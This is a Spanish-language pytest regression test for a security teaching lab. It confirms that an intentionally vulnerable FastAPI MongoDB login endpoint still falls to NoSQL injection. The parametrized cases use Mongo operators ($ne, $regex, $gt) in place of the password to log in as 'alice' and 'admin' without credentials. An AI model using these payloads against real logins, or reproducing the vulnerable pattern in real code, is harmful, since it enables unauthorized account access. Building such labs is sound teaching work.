"""
Prueba de regresión del BASELINE: demuestra que la API vulnerable SÍ es explotable
(si un día dejara de serlo, el laboratorio ya no ilustraría el ataque).
"""
import importlib
import os
import sys

import mongomock
import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "fastapi-app"))


@pytest.fixture()
def client():
    mv = importlib.import_module("app.main_vulnerable")
    db = mongomock.MongoClient().tienda
    db.usuarios.insert_many([
        {"username": "admin", "password": "S3cr3t!", "rol": "admin"},
        {"username": "alice", "password": "alice123", "rol": "cliente"},
    ])
    mv.db = db
    return TestClient(mv.app)


@pytest.mark.parametrize("payload, esperado", [
    ({"username": "alice", "password": {"$ne": "x"}}, "alice"),
    ({"username": {"$regex": "^adm"}, "password": {"$gt": ""}}, "admin"),
])
def test_nosqli_permite_entrar_sin_contrasena(client, payload, esperado):
    r = client.post("/login_mongo", json=payload)
    assert r.status_code == 200 and r.json()["usuario"] == esperado


def test_login_legitimo_y_fallido(client):
    ok = client.post("/login_mongo", json={"username": "alice", "password": "alice123"})
    ko = client.post("/login_mongo", json={"username": "alice", "password": "mala"})
    assert ok.status_code == 200 and ko.status_code == 401
